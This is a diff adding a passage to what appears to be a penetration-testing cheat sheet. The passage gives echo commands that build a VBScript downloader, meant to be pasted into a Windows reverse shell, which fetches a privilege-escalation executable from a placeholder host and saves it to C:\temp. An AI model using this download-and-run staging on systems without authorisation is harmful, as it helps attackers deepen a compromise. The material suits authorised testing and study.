@@ -1150,6 +1150,38 @@ File Transfers
 -   Creating a wget VB Script on Windows:  
     [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)
 
+-   Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):
+
+         echo Set args = Wscript.Arguments  >> webdl.vbs
+         timeout 1
+         echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
+         timeout 1
+         echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
+         timeout 1
+         echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
+         timeout 1
+         echo xHttp.Open "GET", Url, False  >> webdl.vbs
+         timeout 1
+         echo xHttp.Send  >> webdl.vbs
+         timeout 1
+         echo with bStrm      >> webdl.vbs
+         timeout 1
+         echo 	.type = 1 '      >> webdl.vbs
+         timeout 1
+         echo 	.open      >> webdl.vbs
+         timeout 1
+         echo 	.write xHttp.responseBody      >> webdl.vbs
+         timeout 1
+         echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
+         timeout 1
+         echo end with >> webdl.vbs
+         timeout 1
+         echo
+
+      The file can be run using the following syntax:
+      
+      `C:\temp\cscript.exe webdl.vbs`
+      
 -   Mounting File Shares
 
     -   Mount NFS share to /mnt/nfs  
